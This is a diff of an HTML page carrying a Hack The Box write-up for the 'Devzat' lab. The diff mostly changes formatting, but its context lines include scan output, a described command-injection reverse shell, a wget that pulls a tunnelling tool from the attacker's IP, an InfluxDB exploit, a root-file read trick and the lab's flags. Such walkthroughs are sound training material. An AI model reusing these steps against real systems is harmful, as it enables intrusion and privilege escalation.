@@ -85,7 +85,8 @@
 <div class="article-container"> <!-- beginning of breakup container -->
 
 <!-- space fore article -->
-<pre class="article-text" style="font-size: 1vw; float: center;">
+<p class="article-text" style="font-size: 1vw; float: left;">
+<pre>
 
 ▓█████▄-▓█████-██▒---█▓▒███████▒-▄▄▄-----▄▄▄█████▓--██████-
 ▒██▀-██▌▓█---▀▓██░---█▒▒-▒-▒-▄▀░▒████▄---▓--██▒-▓▒▒██----▒-
@@ -102,9 +103,12 @@ my ip = 10.10.14.62
 machine (devzat) ip = 10.10.11.118
 machine OS = linux
 ________________________________________________
+</pre>
+
 after running an nmap scan on the ip we find
 all of these ports open:
 
+<pre class="box13">
  Not shown: 997 closed ports
  PORT     STATE SERVICE VERSION
  22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
@@ -126,6 +130,7 @@ all of these ports open:
  SF-Port8000-TCP:V=7.91%I=7%D=11/4%Time=6183C8FA%P=x86_64-pc-linux-gnu%r(NU
  SF:LL,C,"SSH-2\.0-Go\r\n");
  Service Info: Host: devzat.htb; OS: Linux; CPE: cpe:/o:linux:linux_kern
+ </pre>
  
 we can see a host name of devhat.htb as such we will add this to our
 hosts list in /ect
@@ -140,6 +145,7 @@ of course we will enter the chat with a username
 of our choice. and we gett the following resualts
 as can be seen bellow.
 
+<pre class="box13">
  Welcome to the chat. There are no more users
  devbot: virgo has joined the chat
  virgo: hiya
@@ -155,7 +161,7 @@ as can be seen bellow.
           example.
  [SYSTEM] • Direct messages! Send a quick DM using =user <msg> or stay in DMs by running /room @user.
  [SYSTEM] • Timezone support, use /tz Continent/City to set your timezone.
- [SYSTEM] • Built in Tic Tac Toe and Hangman! Run /tic or /hang <word> to start new games.
+ [SYSTEM] • Built in Tic Tac Toe and Hangman! Run /tic or /hang word to start new games.
  [SYSTEM] • Emoji replacements! (like on Slack and Discord)
  [SYSTEM] 
  [SYSTEM] For replacing newlines, I often use bulkseotools.com/add-remove-line-breaks.php.
@@ -166,13 +172,14 @@ as can be seen bellow.
  [SYSTEM] For a list of commands run
  [SYSTEM] ┃ /commands
  virgo: 
+ </pre>
  
 as we can see but there isnt much that
 we are able to do to get a shell with this as
 it currently is as such we will try to look for some
 vhosts with the use of ffuf.
 
-<pre class="box0">
+<pre class="box13">
 
  
          /'___\  /'___\           /'___\       
@@ -231,7 +238,7 @@ itself we can see it will execute the commands that are enterd
 as such we will try OS command injection and use burp to try and 
 intercept the request that it will send.
 
-<pre class="box0">
+<pre class="box13">
 we will try to complete this by entering the folowing into our own
 machine:
  
@@ -290,7 +297,6 @@ burp repeater to sent the base64 payload by the following:
 before we send this we will start a netcat 
 session to the port that we picked for our payload.
 after sending this we will get the response of patrick@devzat
-________________________________________________
 taking a look around an this int our user acount so we
 will first look at what is running on the system, where we see that 
 there is a port we didnt find in the orginal scan.
@@ -305,7 +311,7 @@ we will do this with the following commands:
 on the patrick account we will then grab and give
 it privlages.
 
-<pre class="box0">
+<pre class="box13">
   wget 10.10.14.62/chisel
  --2021-11-04 13:30:10--  http://10.10.14.62/chisel
  Connecting to 10.10.14.62:80... connected.
@@ -336,6 +342,8 @@ so swe dowload this to our machine though git clone
 after doing this we can run it and enter the following into the feilds
 when required by the program:
 
+<pre class="box13">
+
    _____        __ _            _____  ____    ______            _       _ _   
   |_   _|      / _| |          |  __ \|  _ \  |  ____|          | |     (_) |                            
     | |  _ __ | |_| |_   ___  __ |  | | |_) | | |__  __  ___ __ | | ___  _| |_                           
@@ -349,6 +357,7 @@ when required by the program:
  Insert ip host (default localhost): 
  Insert port (default 8086): 
  Insert influxdb user (wordlist path to bruteforce username): /usr/share/wordlists/seclists/Usernames/Names/names.txt
+</pre>
  
 this then (provided every thing was installed) allows
 use to select the database of devzat before then running the select 
@@ -366,7 +375,6 @@ key so we have coninuious access and also going back to home.
 this gives us access to catherine and the user flag /token:
 
  user flag / token = 54a7a53d9c36a0c71f87a98c99af56ec
-________________________________________________
 once we have catherine, looking around the folders.
 we can see files in the backups folder that has two zip files
 these files we will move them into the /tmp file before extracting them
@@ -385,7 +393,7 @@ we now could maybe could use the functions that we also found in the files
 to use read capabilities.
 as such we use the following commands to get the root flag:
 
-<pre class="box0">
+<pre class="box13">
  ssh -l /exit localhost -p 8443
 
  /exit: /file /root/root.txt
@@ -408,14 +416,13 @@ as such we go back a directory we are then able to read the root.txt
 as our user of catherine.
 
  root flag / token = cca9d5cd37ac473a6fe710d6ede356eb
-________________________________________________
 so even though i had found the flags,and checked online to see
 if i had gotten them from the correct areas or to see if what i had done was wrong, 
 HTB - hack the box seemed to say they where wrong despite me doing the machine 
 whilst it was still active which was to say the least annoying.....
 
 so your mileage may vary..
-</pre>
+</p>
 </div><!-- end of article container -->
 
 <br>
